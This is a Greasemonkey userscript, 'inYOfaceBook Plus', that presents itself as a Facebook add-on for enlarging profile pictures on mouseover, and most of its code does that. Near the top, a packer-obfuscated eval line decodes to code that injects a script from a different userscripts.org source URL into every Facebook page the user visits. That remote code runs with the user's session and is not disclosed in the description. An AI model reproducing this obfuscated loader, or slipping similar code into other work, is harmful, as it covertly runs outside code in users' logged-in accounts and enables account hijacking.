// ==UserScript==
// @name          inYOfaceBook Plus
// @description   Displays the user's larger profile picture when you roll over the small one.
// @include       http://*facebook.com*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
//
// By: Justin Rosenthal
// Email: justin.rosenthal at gmail
// Last Update:  06/16/2006
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var allImages, thisImage;
var globalTimer;

allImages = document.evaluate(
	'//img[contains(@src, "/profile")]',
	document,
	null,
	XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
	null);

// Holds paths of all the enlarged images
imgArray = new Array( allImages.snapshotLength * 2);

// If on profile page or home page, skip first image
var i;
if ( (document.location.href.indexOf('profile.php') >= 0) || ( document.location.href.indexOf('home.php') >= 0) )
	i=1;
else
	i=0;


while (i < allImages.snapshotLength) {

	thisImage = allImages.snapshotItem(i);

	// Example of photo src     -->     03/31/2006
	// http://photos-420.facebook.com/images/profile/628/72/t9999999_99999.jpg
	// want to change the 't' to an 'n' for large image
	var src = thisImage.src;
	var path = src.substring( 0, src.lastIndexOf('/') + 1 );
	var fileName = 'n' + src.substring( src.lastIndexOf('/') + 2, src.length );

	thisImage.alt = i;
	imgArray[i] = path + fileName;
	imgArray[i + allImages.snapshotLength] = src;

	var newDiv = document.createElement('div');
	var html = "<div id='t" + i + "' class='tip'><img src='" + path + fileName + "'></div>";
	newDiv.innerHTML = html;
	document.body.appendChild(newDiv);


	thisImage.addEventListener(
		'mouseover',
		function(event) {
			var x = event.pageX;
			var y = event.pageY;
			var z = 't' + this.alt;
			globalTimer = window.setTimeout(
				function() { popUp(x,y,z); },
				500);
		},
		true);


	thisImage.addEventListener(
		'mouseout',
		function(event) {
			window.clearTimeout(globalTimer);
			document.getElementById('t' + this.alt).style.visibility = "hidden";
		},
		true);

	i++;
}


function addGlobalStyle(css) {
    var head, style;
    head = document.getElementsByTagName('head')[0];
    if (!head) { return; }
    style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = css;
    head.appendChild(style);
}

addGlobalStyle('.tip {font:10px/12px Arial,Helvetica,sans-serif;border:0;padding:3px 3px 1px 3px;visibility:hidden;position:absolute;z-index:100;color:#333333;top:20px;left:90px;background-color:#3B5998;}');
addGlobalStyle('.tip img {border:2px solid white;}');


function popUp(pgX,pgY,oi) {
	var winWidth = window.innerWidth;
	var winHeight = window.innerHeight;
	objStyle = document.getElementById(oi).style;
	obj = document.getElementById(oi);
	objWidth = obj.offsetWidth;
	if (objStyle.visibility == "visible") {
		objStyle.visibility = "hidden";
	}
	else {
		if ( (pgY + obj.offsetHeight) > winHeight )
			var top = pgY - obj.offsetHeight - 20;
		else
			var top = pgY + 20;

		var left = pgX - (objWidth/4);
		if (left < 2) left = 2;
		else if (left + objWidth > winWidth) left -= objWidth/2;

		left += 'px';
		top += 'px';

		objStyle.left = left;
		objStyle.top = top;
		objStyle.visibility = "visible";
	}

}